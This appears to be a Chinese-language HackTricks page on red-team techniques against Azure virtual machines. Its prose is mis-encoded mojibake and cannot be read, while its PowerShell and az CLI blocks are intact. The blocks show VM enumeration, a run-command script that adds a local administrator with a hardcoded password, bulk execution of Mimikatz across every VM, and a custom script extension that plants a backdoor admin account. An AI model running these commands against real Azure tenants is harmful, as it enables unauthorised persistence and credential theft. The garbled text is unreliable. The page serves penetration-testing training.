# Az - è™šæ‹Ÿæœº & ç½‘ç»œ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azureè™šæ‹Ÿæœºæ˜¯Azureæä¾›çš„å‡ ç§[æŒ‰éœ€ã€å¯æ‰©å±•çš„è®¡ç®—èµ„æº](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)ä¹‹ä¸€ã€‚é€šå¸¸ï¼Œå½“æ‚¨éœ€è¦æ¯”å…¶ä»–é€‰æ‹©æä¾›çš„è®¡ç®—ç¯å¢ƒæ›´å¤šæ§åˆ¶æƒæ—¶ï¼Œæ‚¨ä¼šé€‰æ‹©è™šæ‹Ÿæœºã€‚æœ¬æ–‡æä¾›äº†æœ‰å…³åœ¨åˆ›å»ºè™šæ‹Ÿæœºä¹‹å‰åº”è€ƒè™‘çš„äº‹é¡¹ã€å¦‚ä½•åˆ›å»ºè™šæ‹Ÿæœºä»¥åŠå¦‚ä½•ç®¡ç†è™šæ‹Ÿæœºçš„ä¿¡æ¯ã€‚

## Azureç½‘ç»œä¿¡æ¯

Azureç½‘ç»œåŒ…å«**ä¸åŒçš„å®ä½“å’Œé…ç½®æ–¹å¼**ã€‚æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ä¸åŒAzureç½‘ç»œå®ä½“çš„**ç®€è¦æè¿°**ã€**ç¤ºä¾‹**å’Œ**æšä¸¾**å‘½ä»¤ï¼š

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azureå ¡å’æœº

**Azureå ¡å’æœº**æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„ã€å®Œå…¨æ‰˜ç®¡çš„RDPï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰å’ŒSSHï¼ˆå®‰å…¨å¤–å£³ï¼‰è®¿é—®è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡Azureé—¨æˆ·åœ¨SSLä¸Šè¿›è¡Œã€‚å®ƒé›†æˆåœ¨Azureè™šæ‹Ÿç½‘ç»œä¸­ï¼Œå…è®¸ä½¿ç”¨ç§æœ‰IPçš„VMè¿›è¡ŒRDPå’ŒSSHè¿æ¥ï¼Œé¿å…äº†éœ€è¦å…¬å…±IPçš„æƒ…å†µã€‚è¿™ä½¿å…¶æˆä¸ºä¼ ç»Ÿæ–¹æ³•çš„æ›´å®‰å…¨ã€æ›´ä¾¿æ·çš„æ›¿ä»£æ–¹æ¡ˆï¼Œä¼ ç»Ÿæ–¹æ³•æ¶‰åŠä¸ºVMè®¿é—®åˆ†é…å…¬å…±IPå’ŒNSGè§„åˆ™é…ç½®ã€‚å¼€å‘äººå‘˜å’ŒITäººå‘˜å¯ä»¥é€šè¿‡ä»–ä»¬çš„Webæµè§ˆå™¨ä»Azureé—¨æˆ·å®‰å…¨è®¿é—®VMï¼Œç®€åŒ–äº†å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒçš„æµç¨‹ã€‚

è¦åˆ—å‡ºè®¢é˜…ä¸­çš„æ‰€æœ‰Azureå ¡å’ä¸»æœºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## VMæšä¸¾
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå‘½ä»¤**

### **åœ¨VMä¸­è¿›è¡ŒAADç™»å½•**

å¯ä»¥å…è®¸é€šè¿‡AzureADè¿›è¡Œèº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ã€‚ä¾‹å¦‚ï¼Œå°è¯•è®¿é—®**Linux VM**ï¼š`ssh username@azure-corp.com@1.1.1.1`ï¼ˆé‡è¦çš„æ˜¯**ä½¿ç”¨åœ¨å°è¯•ç™»å½•æ—¶ä½¿ç”¨çš„azurecorpçš„ç”µå­é‚®ä»¶**ï¼‰ï¼Œå¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼š
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

åªéœ€**æŒ‰ç…§ä»¥ä¸‹è¯´æ˜**å‰å¾€ [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) å¹¶è¾“å…¥ä»£ç ï¼Œä½¿ç”¨ç”µå­é‚®ä»¶å’Œå¯†ç ä½œä¸ºå‡­æ®ï¼Œç„¶åæ‚¨å°±å¯ä»¥é€šè¿‡ SSH è¿æ¥ï¼ˆå¦‚æœè¯¥ç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™è¿›è¡Œæ“ä½œï¼š`Virtual Machine Administrator Login` æˆ– `Virtual Machine User Login` è§’è‰²ï¼‰ã€‚

### **è¿è¡Œå‘½ä»¤**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **è¿è¡Œè‡ªå®šä¹‰è„šæœ¬æ‰©å±•**

Azureè™šæ‹Ÿæœºï¼ˆVMï¼‰æ‰©å±•æ˜¯æä¾›åœ¨Azure VMä¸Šè¿›è¡Œéƒ¨ç½²åé…ç½®å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡çš„**å°å‹åº”ç”¨ç¨‹åº**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè™šæ‹Ÿæœºéœ€è¦è½¯ä»¶å®‰è£…ã€é˜²ç—…æ¯’ä¿æŠ¤æˆ–åœ¨å…¶ä¸­è¿è¡Œè„šæœ¬çš„èƒ½åŠ›ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨VMæ‰©å±•ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰å†™å…¥æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼š
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC)æ˜¯ç±»ä¼¼äºAnsibleçš„PowerShellå·¥å…·ï¼Œç”¨äºé€šè¿‡ä»£ç è®¾ç½®ä¸»æœºã€‚DSCä¸Azureé›†æˆï¼Œå…è®¸ä¸Šä¼ ç‰¹å®šé…ç½®æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å¿…é¡»éµå¾ªä¸¥æ ¼çš„è¯­æ³•ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒAzureä¸­çš„DSCæ‰©å±•å¯ä»¥æ‰§è¡Œæ¥è‡ªç¬¦åˆç‰¹å®šæ ¼å¼æ ‡å‡†çš„æ–‡ä»¶çš„å‘½ä»¤ï¼Œå³ä½¿è¯­æ³•ä¸ç¬¦åˆDSCæ ‡å‡†ï¼Œå¦‚æ‰€ç¤ºçš„å›¾ä¸­æ‰€ç¤ºã€‚

è¿™äº›å‘½ä»¤çš„æ‰§è¡Œç”±Az PowerShellä¸­çš„[**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)å‡½æ•°å®ç°ã€‚è¦æ±‚åŒ…æ‹¬ä¸€ä¸ªå…·æœ‰å®šä¹‰å‡½æ•°çš„**.PS1**æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å¿…é¡»è¢«å‹ç¼©æˆ**.zip**æ–‡ä»¶ã€‚å³ä½¿è¯­æ³•å¯èƒ½ä¸ç¬¦åˆDSCçš„è¦æ±‚ï¼Œä»£ç ä»å°†æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œæ‰©å±•å°†æ ‡è®°æ‰§è¡ŒçŠ¶æ€ä¸ºâ€œå¤±è´¥â€ï¼Œç”±äºçŠ¶æ€è¢«å¤±è´¥æ¶ˆæ¯è¦†ç›–ï¼Œå› æ­¤ä¸ä¼šæ˜¾ç¤ºå‘½ä»¤çš„ä»»ä½•è¾“å‡ºã€‚

### VM Application Definitions

VMåº”ç”¨ç¨‹åºå®šä¹‰å…è®¸å°†ç»è¿‡ç‰ˆæœ¬åŒ–çš„åº”ç”¨ç¨‹åºé‡å¤éƒ¨ç½²åˆ°Azure VMã€‚æ­¤èµ„æºæ”¯æŒåœ¨VMä¹‹é—´éƒ¨ç½²å’Œæ›´æ–°åº”ç”¨ç¨‹åºã€‚è¦è®¾ç½®æ­¤åŠŸèƒ½ï¼Œéœ€è¦æ‰§è¡Œå‡ ä¸ªæ­¥éª¤ï¼Œæ¶‰åŠAz PowerShellä¸­çš„**`New-AzGalleryApplication`**å’Œ**`New-AzGalleryApplicationVersion`**ç­‰å‘½ä»¤ã€‚

é€šè¿‡æ­¤æ–¹æ³•æ‰§è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤æ¶‰åŠ**â€œVMAppExtensionâ€**ï¼Œå½“å°†åº”ç”¨ç¨‹åºåº”ç”¨äºVMæ—¶ï¼Œæ­¤æ‰©å±•ä¼šè‡ªåŠ¨å®‰è£…ã€‚è¯¥æ‰©å±•ä»æŒ‡å®šçš„URIæ£€ç´¢æ–‡ä»¶ï¼Œå¹¶å°†å…¶å‘½åä¸ºåº”ç”¨ç¨‹åºçš„åç§°ï¼Œä¸å¸¦æ‰©å±•åã€‚ä¸ºäº†æ­£ç¡®æ‰§è¡Œæ–‡ä»¶ï¼Œå¿…é¡»é…ç½®REST APIè°ƒç”¨ä¸­çš„â€œManageActionsâ€å­—æ®µä»¥ä½¿ç”¨é€‚å½“çš„æ‰©å±•åé‡å‘½åæ–‡ä»¶ã€‚ä¸€æ—¦å®Œæˆæ­¤æ–¹æ³•çš„è®¾ç½®ï¼Œå…¶ç»“æ„å°†ç±»ä¼¼äºæä¾›çš„å›¾ä¸­æ‰€ç¤ºã€‚

ç„¶è€Œï¼Œæ­¤æ‰§è¡Œæ–¹æ³•ç›¸å¯¹è¾ƒæ…¢ï¼Œå¤§çº¦éœ€è¦3-4åˆ†é’Ÿæ¥æ‰§è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚ä¸æ­¤è¿‡ç¨‹ç›¸å…³çš„æ–‡ä»¶å­˜å‚¨åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆ`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`ç”¨äºåº”ç”¨ç¨‹åºå¤åˆ¶ï¼Œ`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ç”¨äºæ‰§è¡ŒçŠ¶æ€ï¼‰ã€‚

è¿™ä¸¤ç§æŠ€æœ¯æä¾›äº†åœ¨Azureç¯å¢ƒä¸­æ‰§è¡Œå‘½ä»¤å’Œéƒ¨ç½²åº”ç”¨ç¨‹åºçš„ç‹¬ç‰¹æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•éƒ½æœ‰è‡ªå·±çš„ä¸€ç»„è¦æ±‚ã€æ­¥éª¤å’Œæ³¨æ„äº‹é¡¹ã€‚

### Azureä¸­çš„æ··åˆå·¥ä½œç»„ï¼ˆHWGsï¼‰

[**æ··åˆå·¥ä½œç»„ï¼ˆHWGsï¼‰**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)æ˜¯Azureä¸­çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸åœ¨é…ç½®åœ¨è‡ªåŠ¨åŒ–å¸æˆ·ä¸­çš„Runbookåœ¨æŒ‡å®šHWGçš„Azureè™šæ‹Ÿæœºï¼ˆVMï¼‰ä¸Šæ‰§è¡Œã€‚æ­¤æ‰§è¡Œé€šè¿‡å®‰è£…åœ¨VMä¸Šçš„æ‰©å±•å®ç°ï¼Œè¯¥æ‰©å±•å°†Runbookä»£ç éƒ¨ç½²åˆ°VMä¸Šã€‚æ­¤è¿‡ç¨‹çš„ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯å®é™…å‡­æ®ä¸å½±å“æ‰§è¡Œï¼Œå› ä¸ºä»£ç ä»¥ç‰¹æƒèº«ä»½ï¼Œå…·ä½“ä¸º**SYSTEM**æˆ–rootè¿è¡Œï¼Œå¦‚æä¾›çš„å›¾ä¸­æ‰€ç¤ºã€‚

å¯¹äºä½¿ç”¨Windows 10 VMçš„ç”¨æˆ·çš„ä¸€ä¸ªå…³é”®ç»†èŠ‚æ˜¯éœ€è¦ä¸ºRunbookæŒ‡å®šPowerShellç‰ˆæœ¬ã€‚åº”å°†å…¶è®¾ç½®ä¸ºä»¥PowerShellç‰ˆæœ¬5.1è¿è¡Œï¼Œè€Œä¸æ˜¯7.1ã€‚è¿™ä¸€è¦æ±‚æºäºWindows 10 VMä¸Šé»˜è®¤æœªå®‰è£…PowerShell 7.1ï¼Œå¦‚æœæŒ‡å®šäº†ç‰ˆæœ¬7.1ï¼Œåˆ™ä¼šå¯¼è‡´è„šæœ¬æ‰§è¡Œå¤±è´¥ã€‚

Azureçš„æ­¤åŠŸèƒ½æä¾›äº†ä¸€ç§å¼ºå¤§çš„æ–¹æ³•ï¼Œç”¨äºåœ¨æ··åˆç¯å¢ƒä¸­è‡ªåŠ¨åŒ–å’Œç®¡ç†ä»»åŠ¡ï¼Œå…è®¸åœ¨Azure VMä¸Šé›†ä¸­ç®¡ç†å’Œæ‰§è¡Œä»»åŠ¡ã€‚


## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆHackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
